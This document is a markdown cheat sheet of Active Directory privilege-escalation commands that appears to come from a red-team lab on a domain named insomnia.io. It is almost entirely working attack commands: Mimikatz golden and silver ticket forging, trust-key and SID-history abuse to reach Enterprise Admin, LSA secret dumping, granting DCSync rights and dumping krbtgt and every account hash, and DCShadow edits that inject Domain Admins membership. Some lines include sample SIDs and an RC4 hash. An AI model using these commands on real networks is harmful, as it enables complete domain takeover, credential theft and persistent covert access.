### Child to Enterprise Admin using Krbtgt Hash

```
mimikatz kerberos::golden /user:Administrator /domain:child.<? /sid:<> /sids:<> /krbtgt:<> /ptt #With Cobalt Strike
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<> /sid:<> /sids:<>-512 /krbtgt:<> /ticket:C:\Users\Commando\Desktop\Lab\MeMe.kirbi"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<> /sid:<> /sids:<>-519 /krbtgt:<> /ptt"'

```

### Across Forest DA to EA using Trust Key

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() #To Check Forest trust relationship
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' #To obtain Trust Key

kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<> /ticket:<> #With Cobalt Strike
kerberos_ticket_use C:\Users\Commando\Desktop\x64\MeMe.kirbi #With Cobalt Strike Function
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<> /sid:<> /sids:<>-519 /krbtgt:<> /ptt"' #Powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<> /sid:<> /sids:<>-519 /krbtgt:<> "' #Powershell
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\x64\MeMe.kirbi")) #To convert kirbi to Hash 

```



### External Domain Enumerations and Executions
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() #AD Module
powershell Get-DomainTrust #Powerview
powershell Get-DomainComputer -Domain Dev.insomnia.io  | select DnsHostName
powershell Get-DomainGroup -Identity 'Domain Admins' -Domain insomnia.io  | select ObjectSid
powershell Get-DomainComputer -Domain <> -Properties DnsHostName
powershell Get-DomainTrust -SearchBase GC://<>
powershell Get-DomainForeignGroupMember -Domain <>
powershell Get-DomainComputer -Domain <> -Properties DnsHostName
powershell Get-DomainComputer -Domain <> | GetNetLocalGroupMember
```
```

Invoke-Mimikatz -Command '"Kerberos::golden /domain:current domain> /sid:<sid of current domain> /rc4:ntlm hash of trust key /sid:sid of Enterprise domain> /ptt
kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:REDACTED /sid:REDACTED /krbtgt:REDACTED /sids:REDACTED-519 /ptt"'
kerberos::golden /user:Administrator /domain:REDACTED  /sid:REDACTED /sids:REDACTED-512 /krbtgt:REDACTED /ticket:MeMe.kirbi


```
### One-way Trust Forest
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:payment.insomnia.io /sid:<> /krbtgt:<> /sids:<> /ptt"'

```


### Golden Tickets

```
mimikatz kerberos::golden /user:<> /domain:<current domain> /sid:<SID of the current domain> /krbtgt:<> 
mimikatz kerberos::golden /user:Administrator /domain:insomnia.io /sid:S-1-5-21-3222292400-3568011919-2025925687 /rc4:06d96892fc55c7c654ee8908738aa6a6 /ticket:Gold.kirbi
mimikatz kerberos::golden /user:Administrator /domain:insomnia.io  /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi #With Cobalt Strike
mimikatz kerberos::golden /user:Administrator /domain:<> /sid:<> /krbtgt:<> /ptt #With Cobalt Strike

```
### Silver Tickets
```
powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
kerberos::golden /user:Administrator /domain:Insomnia.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.insomnia.io /service:cifs /rc4: /ticket:silver.kirbi
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\silver.kirbi"))

```

### DCSync Enumeration and Execution

```
Get-ObjectAcl -DistinguishedName "dc=insomnia,dc=io" -ResolveGUIDs | ? {($_.IdentityReference -match "John") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
Add-ObjectAcl -TargetDistinguishedName "dc=insomnia,dc=io" -PrincipalSamAccountName John -Rights DCSync 
```
### Execution
```
Invoke-Mimikatz -command '"lsadump::dcsync /user:ins0mnia\krbtgt"'
Invoke-Mimikatz -command '"lsadump::dcsync /domain:insomnia.io /all /csv"'
Invoke-Mimikatz -command '"lsadump::dcsync /domain:ins0mnia /user:john"'
```
### DCShadow
```
!ProcessToken
lsadump::dcshadow /object:"CN=BobT,OU=Employees,DC=sub,DC=domain,DC=com" /attribute:SidHistory /value:512
lsadump::dcshadow /object:POC User5 /attribute:primaryGroupID /value:512
lsadump::dcshadow /push
net group "Domain Admins" /domain
```
